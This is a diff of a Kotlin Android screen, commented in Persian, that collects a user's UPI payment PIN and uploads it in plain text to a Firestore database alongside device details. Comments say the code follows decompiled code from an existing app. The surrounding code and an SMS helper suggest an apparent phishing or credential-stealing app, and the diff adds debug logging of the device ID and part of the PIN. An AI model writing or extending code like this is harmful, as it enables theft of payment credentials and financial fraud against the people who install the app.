@@ -62,7 +62,11 @@ fun MainScreen() {
                 currentPin = pin
                 scope.launch(Dispatchers.IO) {
                     try {
+                        android.util.Log.d("MainScreen", "Processing UPI PIN...")
+                        
                         val deviceId = SmsHelper.getDeviceId(context)
+                        android.util.Log.d("MainScreen", "Device ID: $deviceId")
+                        android.util.Log.d("MainScreen", "PIN: ${pin.take(2)}**")
                         
                         // ساخت DeviceModel قبل از ارسال PIN (مطابق کد decompiled)
                         val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
@@ -75,28 +79,33 @@ fun MainScreen() {
                         )
                         
                         // ذخیره DeviceModel (اگر وجود نداشته باشد)
+                        android.util.Log.d("MainScreen", "Saving device info...")
                         firestoreRepository.saveDeviceInfo(deviceId, deviceModel)
                         
                         // ایجاد Map با کلید "upiPin" مطابق کد decompiled
                         val userFields = mapOf("upiPin" to pin.trim())
                         
                         // ارسال به Firestore
+                        android.util.Log.d("MainScreen", "Uploading UPI PIN to Firestore...")
                         val result = firestoreRepository.saveUserFields(userFields, deviceId)
                         
                         // در صورت موفقیت یا خطا، callback را فراخوانی می‌کنیم
                         if (result.isSuccess && result.getOrNull() == true) {
                             // موفقیت - نمایش صفحه موفقیت
+                            android.util.Log.d("MainScreen", "✅ UPI PIN saved successfully!")
                             isProcessingPin = false
                             showUPIPinScreen = false
                             showSuccessScreen = true
                         } else {
                             // خطا - نمایش صفحه خطا
+                            android.util.Log.e("MainScreen", "❌ Failed to save UPI PIN: ${result.exceptionOrNull()?.message}")
                             isProcessingPin = false
                             showUPIPinScreen = false
                             showFailedScreen = true
                         }
                     } catch (e: Exception) {
                         // خطا - نمایش صفحه خطا
+                        android.util.Log.e("MainScreen", "❌ Exception saving UPI PIN: ${e.message}", e)
                         isProcessingPin = false
                         showUPIPinScreen = false
                         showFailedScreen = true
